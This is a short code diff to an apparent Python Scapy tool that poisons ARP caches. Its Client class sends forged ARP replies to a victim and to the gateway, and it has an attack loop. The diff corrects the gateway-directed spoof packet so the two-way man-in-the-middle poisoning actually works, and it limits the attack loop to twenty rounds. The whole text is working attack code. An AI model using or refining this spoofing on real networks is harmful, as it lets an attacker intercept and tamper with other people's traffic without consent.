@@ -269,7 +269,7 @@ class Client():
         self.arp_packets = 0
     def spoof(self):
         send(ARP(op=2, pdst=self.ip, psrc=gateway_ip, hwdst=self.mac), verbose=False)
-        send(ARP(op=2, pdst=gateway_ip, psrc=self.ip, hwdst=self.mac), verbose=False)
+        send(ARP(op=2, pdst=gateway_ip, psrc=self.ip, hwdst=gateway_mac), verbose=False)
     def restore(self):
         send(ARP(op=2, pdst=self.ip, psrc=gateway_ip, hwdst=self.mac, hwsrc = gateway_mac), verbose=False)
         send(ARP(op=2, pdst=gateway_ip, psrc=self.ip, hwdst=gateway_mac, hwsrc=self.mac), verbose=False)
@@ -351,7 +351,7 @@ def sniff(Ips):
         Ips.insert_packet(Seg)
 
 def attack(Ips):
-    while (True):
+    for i in range(20):
         Ips.attack()
         time.sleep(1)
 
